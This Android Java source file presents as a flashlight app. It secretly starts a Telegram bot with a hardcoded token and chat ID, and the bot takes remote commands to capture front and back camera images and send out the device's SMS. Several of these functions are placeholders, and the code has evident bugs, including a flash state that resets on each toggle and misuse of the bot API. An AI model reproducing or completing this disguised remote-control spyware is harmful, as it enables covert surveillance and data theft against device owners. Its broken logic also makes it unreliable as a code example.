package com.example.telegramcontrol;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import org.telegram.telegrambots.ApiContext;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

public class MainActivity extends Activity {
    private static final String TOKEN = "7971156244:AAEpuovIXsN8Ujfd1p5rQowmsEy_9ADUXzs";
    private static final String CHAT_ID = "7819779147";
    private Button flashlightButton;
    private CameraManager cameraManager;
    private String cameraId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        flashlightButton = findViewById(R.id.flashlight_button);
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);

        // Get the camera id (for flashlight control)
        try {
            cameraId = cameraManager.getCameraIdList()[0]; // Default camera
        } catch (Exception e) {
            e.printStackTrace();
        }

        flashlightButton.setOnClickListener(view -> toggleFlashlight());

        // Start the bot listener thread
        new Thread(() -> startTelegramBot()).start();
    }

    // Toggle flashlight
    private void toggleFlashlight() {
        try {
            boolean isFlashOn = false;
            cameraManager.setTorchMode(cameraId, !isFlashOn);
            isFlashOn = !isFlashOn;
            Toast.makeText(MainActivity.this, isFlashOn ? "Flashlight On" : "Flashlight Off", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Start Telegram bot listener
    private void startTelegramBot() {
        try {
            TelegramLongPollingBot bot = new TelegramLongPollingBot() {
                @Override
                public void onUpdateReceived(Update update) {
                    String message = update.getMessage().getText();
                    if (message.equals("/onflas")) {
                        toggleFlashlight();
                    } else if (message.equals("/screenshotdepan")) {
                        // Capture front screen
                        captureScreenshot("front");
                    } else if (message.equals("/screenshotbelakang")) {
                        // Capture back camera
                        captureScreenshot("back");
                    } else if (message.equals("/sedallsms")) {
                        sendAllSMS();
                    }
                }

                @Override
                public String getBotUsername() {
                    return "YourBotUsername";
                }

                @Override
                public String getBotToken() {
                    return TOKEN;
                }
            };
            bot.onUpdatesReceived(null);
        } catch (TelegramApiException e) {
            e.printStackTrace();
        }
    }

    // Simulate screenshot
    private void captureScreenshot(String type) {
        // Screenshot capture logic here (not actual code, just a placeholder)
        Toast.makeText(this, "Capture " + type + " screenshot", Toast.LENGTH_SHORT).show();
    }

    // Simulate sending all SMS
    private void sendAllSMS() {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("phone_number", null, "All SMS from your device", null, null);
        Toast.makeText(this, "Sending SMS...", Toast.LENGTH_SHORT).show();
    }
}